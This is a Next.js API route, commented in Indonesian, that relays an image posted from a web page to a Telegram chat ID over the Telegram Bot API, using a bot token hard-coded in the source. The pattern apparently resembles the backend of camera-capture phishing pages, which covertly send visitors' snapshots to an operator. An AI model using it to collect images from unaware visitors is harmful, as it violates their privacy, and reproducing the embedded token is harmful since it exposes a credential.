// pages/api/post.js
import fetch from "node-fetch";

const BOT_TOKEN = "7525794586:AAH9YlfXazDX1zzx1ss23q8RuIqyMJcVzZI"; // ganti!
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).send("Method not allowed");

  const { cat } = req.body;
  const uid = req.query.uid;

  if (!cat || !uid) return res.status(400).send("Missing data");

  try {
    // Kirim ke Telegram
    await fetch(`${TELEGRAM_API}/sendPhoto`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: uid,
        photo: cat,
        caption: "📸 Gambar dari halaman kamu",
      }),
    });

    res.status(200).json({ ok: true });
  } catch (err) {
    console.error("Telegram error:", err);
    res.status(500).send("Telegram error");
  }
}
